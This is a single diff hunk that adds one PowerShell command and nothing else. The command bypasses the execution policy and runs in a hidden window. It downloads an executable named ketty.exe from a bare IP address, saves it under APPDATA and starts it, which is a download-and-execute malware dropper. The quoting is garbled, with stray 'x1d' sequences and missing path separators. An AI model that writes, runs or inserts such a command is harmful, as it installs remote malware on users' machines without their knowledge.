@@ -1,0 +1,1 @@
+PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://93.174.94.135/~kali/ketty.exe',x1d $env:APPDATAprofilest.exex1d );Start-Process (x1d $env:APPDATAprofilest.exex1d )
